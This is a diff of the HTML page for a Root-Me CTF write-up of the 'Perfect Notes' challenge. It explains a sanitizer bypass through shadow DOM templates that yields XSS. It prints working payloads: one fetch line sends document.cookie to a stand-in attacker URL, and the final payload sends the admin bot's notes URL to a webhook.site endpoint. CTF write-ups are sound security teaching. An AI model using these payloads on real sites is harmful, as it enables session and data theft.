@@ -7,16 +7,17 @@
         <title>Writeup - Root-Me CTF 10k - Perfect Notes - Root-Me Blog</title><meta name="Description" content="Root Me allows everyone to test and improve their knowledge in computer security and hacking. Legal. Free. Realistic"><meta property="og:title" content="Writeup - Root-Me CTF 10k - Perfect Notes" />
 <meta property="og:description" content="Writeup of the &lsquo;Perfect Notes&rsquo; challenge during the Root-Me CTF 10k" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://blog.root-me.org/posts/writeup_ctf10k_perfect_notes/" />
+<meta property="og:url" content="https://blog.root-me.org/posts/writeup_ctf10k_perfect_notes/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-03-02T00:00:00+00:00" />
 <meta property="article:modified_time" content="2023-03-02T00:00:00+00:00" /><meta property="og:site_name" content="Root-Me Blog" />
+
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Writeup - Root-Me CTF 10k - Perfect Notes"/>
 <meta name="twitter:description" content="Writeup of the &lsquo;Perfect Notes&rsquo; challenge during the Root-Me CTF 10k"/>
 <meta name="application-name" content="Root-Me Blog">
 <meta name="apple-mobile-web-app-title" content="Root-Me Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.root-me.org/posts/writeup_ctf10k_perfect_notes/" /><link rel="prev" href="https://blog.root-me.org/posts/writeup_ctf10k_proxifier/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.root-me.org/posts/writeup_ctf10k_perfect_notes/" /><link rel="prev" href="https://blog.root-me.org/posts/writeup_ctf10k_proxifier/" /><link rel="next" href="https://blog.root-me.org/posts/how-to-start/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
@@ -68,7 +69,7 @@
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Writeup - Root-Me CTF 10k - Perfect Notes</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="https://mizu.re/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Kévin_Mizu</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.root-me.org/Mizu" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Kévin_Mizu</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-02">2023-03-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1059 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
@@ -134,7 +135,7 @@
         title="notes1.png" /></p>
 <p>Something really important to try in such case is to create a second account and try to access the notes of the first one. In our situation, it seems that knowning the UUID of the notes of a user make to access it!</p>
 <p>Furthermore, testing few XSS payloads seems not to work. So, before going further, let&rsquo;s check the source code of the page. Digging into it, we could find this pretty interesting class:</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="c1">// source: https://github.com/cure53/DOMPurify/blob/e0970d88053c1c564b6ccd633b4af7e7d9a10375/src/purify.js#L866
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="c1">// source: https://github.com/cure53/DOMPurify/blob/e0970d88053c1c564b6ccd633b4af7e7d9a10375/src/purify.js#L866
 </span><span class="c1"></span><span class="kr">const</span> <span class="nx">_isClobbered</span> <span class="o">=</span> <span class="p">(</span><span class="nx">elm</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
     <span class="k">return</span> <span class="p">(</span>
         <span class="nx">elm</span> <span class="k">instanceof</span> <span class="nx">HTMLFormElement</span> <span class="o">&amp;&amp;</span>
@@ -224,13 +225,13 @@
 </ul>
 <h2 id="-nodeiterator">🔁 NodeIterator</h2>
 <p>Because it&rsquo;s using <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener noreffer ">DOMPurify</a> code fragments, at the first look it could seem to be secure but, this is where <a href="https://developer.mozilla.org/en-US/docs/Web/API/NodeIterator" target="_blank" rel="noopener noreffer ">NodeIterator</a> issue comes! If fact, even if it is not written in the MDN documentation, the <code>NodeIterator</code> API won&rsquo;t follow external DOM Tree such as <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe" target="_blank" rel="noopener noreffer ">ShadowDOM</a>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">dom_tree</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMParser</span><span class="p">().</span><span class="nx">parseFromString</span><span class="p">(</span><span class="s2">&#34;&lt;template&gt;&lt;h1&gt;HELLO&lt;/h1&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;text/html&#34;</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">dom_tree</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMParser</span><span class="p">().</span><span class="nx">parseFromString</span><span class="p">(</span><span class="s2">&#34;&lt;template&gt;&lt;h1&gt;HELLO&lt;/h1&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;text/html&#34;</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">nodeIterator</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createNodeIterator</span><span class="p">(</span><span class="nx">dom_tree</span><span class="p">);</span>
 <span class="k">while</span> <span class="p">((</span><span class="nx">currentNode</span> <span class="o">=</span> <span class="nx">nodeIterator</span><span class="p">.</span><span class="nx">nextNode</span><span class="p">()))</span> <span class="p">{</span>
     <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">.</span><span class="nx">nodeName</span><span class="p">)</span>
 <span class="p">}</span>
 </code></pre></div><p>Output:</p>
-<pre><code>#document
+<pre tabindex="0"><code>#document
 HTML
 HEAD
 TEMPLATE
@@ -246,10 +247,10 @@ BODY
         title="meme2.png" /></p>
 <h2 id="-shadow-dom">👻 Shadow DOM</h2>
 <p>The above finding will be really useful as everything inside the shadow DOM won&rsquo;t be sanitized:</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Sanitizer</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Sanitizer</span><span class="p">()</span>
 <span class="nx">s</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="s2">&#34;&lt;template&gt;&lt;img src=x onerror=alert()&gt;&#34;</span><span class="p">)</span>
 </code></pre></div><p>Output:</p>
-<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">template</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;x&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;alert()&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">template</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">template</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;x&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;alert()&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">template</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
 </code></pre></div><p>Perfect! We have our payload, let&rsquo;s simply use it, get an XSS and flag the challenge 🔥 Well, unfortunately that won&rsquo;t be that much simple&hellip;</p>
 <ul>
 <li>What is a Shadow DOM?</li>
@@ -277,7 +278,7 @@ BODY
 <li>Switch <code>shadowroot</code> to open.</li>
 </ul>
 <p>Thus, using the following payload, we finally get our XSS! 🎉</p>
-<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;</span><span class="nt">template</span> <span class="na">shadowroot</span><span class="o">=</span><span class="s">&#34;open&#34;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;alert()&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;</span><span class="nt">template</span> <span class="na">shadowroot</span><span class="o">=</span><span class="s">&#34;open&#34;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;alert()&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
 </code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -289,12 +290,12 @@ BODY
 <p><em>PS: The shadowroot attribute isn&rsquo;t inside the DOMPurify allow list, I have added it especially for this challenge.</em></p>
 <h2 id="-xss">🍪 XSS</h2>
 <p>Now that we have an XSS, we can try to exfiltrate the bot cookies:</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://&lt;attacker-url&gt;?&#34;</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">))</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://&lt;attacker-url&gt;?&#34;</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">))</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
 </code></pre></div><p>But, after waiting 5 minutes, nothing comes&hellip; Which means that the cookie has the <code>HttpOnly</code> flag&hellip; So, we have to find a different way to get an access to admin&rsquo;s notes. By testing a bit the website, we could find a very interesting feature. If you are connected and you access the root URL, it will redirect you to your notes. (based on your session)</p>
 <p>So, we could abuse it to force the admin fetching the root URL and exfiltrate the result page URL which will contain is notes!</p>
 <h2 id="-flag">🎉 Flag</h2>
 <p>Payload:</p>
-<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;</span><span class="nt">template</span> <span class="na">shadowroot</span><span class="o">=</span><span class="s">&#34;open&#34;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;fetch(&#39;/&#39;).then(d =&gt; d.url).then((url) =&gt; { fetch(`https://webhook.site/&lt;your-webhook&gt;?url=${url}`) })&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;</span><span class="nt">template</span> <span class="na">shadowroot</span><span class="o">=</span><span class="s">&#34;open&#34;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;fetch(&#39;/&#39;).then(d =&gt; d.url).then((url) =&gt; { fetch(`https://webhook.site/&lt;your-webhook&gt;?url=${url}`) })&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
 </code></pre></div><p>Waiting for few minutes give us: <code>http://ctf10k.root-me.org:6004/notes/bb9ccf6f-2ec7-4b14-8a6c-6df064ae18a7</code></p>
 <p><img
         class="lazyload"
@@ -326,7 +327,8 @@ BODY
         </section>
     </div>
 
-    <div class="post-nav"><a href="/posts/writeup_ctf10k_proxifier/" class="prev" rel="prev" title="Writeup - Root-Me CTF 10k - Proxifier"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Writeup - Root-Me CTF 10k - Proxifier</a></div>
+    <div class="post-nav"><a href="/posts/writeup_ctf10k_proxifier/" class="prev" rel="prev" title="Writeup - Root-Me CTF 10k - Proxifier"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Writeup - Root-Me CTF 10k - Proxifier</a>
+            <a href="/posts/how-to-start/" class="next" rel="next" title="How to start in cybersecurity">How to start in cybersecurity<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
